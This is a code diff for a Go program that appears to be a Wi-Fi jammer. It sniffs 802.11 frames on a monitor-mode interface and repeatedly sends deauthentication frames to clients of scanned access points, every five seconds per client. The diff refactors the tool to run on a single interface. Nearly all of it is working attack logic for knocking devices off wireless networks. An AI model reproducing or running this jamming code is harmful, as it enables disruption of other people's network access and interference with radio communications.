@@ -3,7 +3,6 @@ package main
 import (
 	"fmt"
 	"log"
-	"net"
 	"os"
 	"os/signal"
 	"syscall"
@@ -18,7 +17,7 @@ import (
 var QuitSIGINT = false
 
 func help() {
-	fmt.Printf("useage: ./%s <util iface> <mon iface> <whitelist>\n", os.Args[0])
+	fmt.Printf("useage: ./%s <iface> <whitelist>\n", os.Args[0])
 	os.Exit(1)
 }
 
@@ -34,66 +33,69 @@ func handleSignals() {
 	signal.Notify(sigc, syscall.SIGINT)
 }
 
-func checkComms(dot11 *layers.Dot11, rtap *layers.RadioTap, aps *List) bool {
+func checkComms(conn *JamConn, aps *List, clients *List, pkt gopacket.Packet) {
 
-	var fromCli = false
-	var cliAddr net.HardwareAddr
-	var apAddr net.HardwareAddr
-	var client Client
-
-	// If this message is wiphy to wiphy and originated from the client
-	if !dot11.Flags.FromDS() && !dot11.Flags.ToDS() {
-		if dot11.Address1.String() == dot11.Address3.String() {
-			apAddr = dot11.Address1
-			cliAddr = dot11.Address2
-		} else {
-			cliAddr = dot11.Address1
-			apAddr = dot11.Address2
-			fromCli = true
-		}
-		if a, ok := aps.Get(apAddr.String()); ok {
-			ap := a.(Ap)
-			if ok, client = ap.GetClient(cliAddr); !ok {
-				client = Client{}
-				client.hwaddr = cliAddr
-			}
-			if fromCli {
-				client.dot11Hdr = *dot11
-				client.radioTapHdr = *rtap
-			} else {
-				ap.radioTapHdr = *rtap
-			}
-			ap.AddClient(client)
-			aps.Add(ap.hwaddr.String(), ap)
-		}
+	if pkt == nil {
+		return
 	}
-	return false
+	radioTap := pkt.Layer(layers.LayerTypeRadioTap)
+	dot11 := pkt.Layer(layers.LayerTypeDot11)
+	if dot11 == nil || radioTap == nil {
+		return
+	}
+	tap := radioTap.(*layers.RadioTap)
+	dot := dot11.(*layers.Dot11)
+	if dot.Flags.FromDS() || dot.Flags.ToDS() {
+		return
+	}
+	// originated from client?
+	if dot.Address1.String() == dot.Address3.String() {
+		return
+	}
+	cliAddr := dot.Address1
+	apAddr := dot.Address2
+	if len(apAddr.String()) >= 16 {
+		if _, ok := aps.Get(apAddr.String()[:16]); !ok {
+			return
+		}
+	} else {
+		return
+	}
+	var cli Client
+	if v, ok := clients.Get(cliAddr.String()); ok {
+		cli = (v).(Client)
+	} else {
+		cli = Client{ hwaddr: cliAddr, lastDeauth: time.Now() }
+	}
+	if time.Since(cli.lastDeauth) > time.Second * 5 {
+		if err := conn.Deauth(cliAddr, apAddr, tap, dot); err != nil {
+			fmt.Println("error deauthing")
+		}
+		cli.lastDeauth = time.Now()
+	}
+	clients.Add(cli.hwaddr.String(), cli)
 }
 
 func main() {
 
-	if len(os.Args) < 4 {
+	if len(os.Args) < 3 {
 		help()
 	}
 	handleSignals()
-	utilIfa, err := NewJamConn(os.Args[1])
+	monIfa, err := NewJamConn(os.Args[1])
 	if err != nil {
 		log.Fatalln("NewJamConn()", err)
-	}
-	defer func(){
-		if err := utilIfa.nlconn.Close(); err != nil {
-			log.Fatalln("genetlink.Conn.Close()", err)
-		}
-	}()
-	monIfa, err := NewJamConn(os.Args[2])
-	if err != nil {
-		log.Fatalln("NewJamConn() ", err)
 	}
 	defer func(){
 		if err := monIfa.nlconn.Close(); err != nil {
 			log.Fatalln("genetlink.Conn.Close()", err)
 		}
 	}()
+	whiteList, err := getWhiteListFromFile()
+	apList, err := monIfa.DoAPScan(&whiteList)
+	if err != nil {
+		log.Fatalln("doAPScan()", err)
+	}
 	if err := monIfa.SetIfaType(nl80211.IFTYPE_MONITOR); err != nil {
 		log.Fatalln("JamConn.SetIfaType()", err.Error())
 	}
@@ -112,14 +114,10 @@ func main() {
 	if err := monIfa.SetDeviceChannel(1); err != nil {
 		log.Fatalln("JamConn.SetDeviceChannel()", err.Error())
 	}
-	whiteList, err := getWhiteListFromFile()
 	if err != nil {
 		log.Fatalln("getWhiteListFromFile()", err)
 	}
-	apList, err := utilIfa.DoAPScan(&whiteList)
-	if err != nil {
-		log.Fatalln("doAPScan()", err)
-	}
+	var clients List
 	packSrc := gopacket.NewPacketSource(monIfa.handle, monIfa.handle.LinkType())
 	monIfa.SetLastChanSwitch(time.Now())
 	monIfa.SetLastDeauth(time.Now())
@@ -130,18 +128,7 @@ func main() {
 				log.Fatalln("gopacket.PacketSource.NextPacket()", err.Error())
 			}
 		}
-		if packet != nil {
-			radioTap := packet.Layer(layers.LayerTypeRadioTap)
-			dot11 := packet.Layer(layers.LayerTypeDot11)
-			if dot11 != nil && radioTap != nil {
-				radioTap := radioTap.(*layers.RadioTap)
-				dot11 := dot11.(*layers.Dot11)
-				checkComms(dot11, radioTap, &apList)
-			}
-		}
-		if err := monIfa.DeauthClientsIfPast(time.Second * 7, &apList); err != nil {
-			log.Fatalln("JamConn.DeauthClientsIfPast()", err)
-		}
+		checkComms(monIfa, &apList, &clients, packet)
 	}
 		//monIfa.ChangeChanIfPast(time.Second * 2)
 }
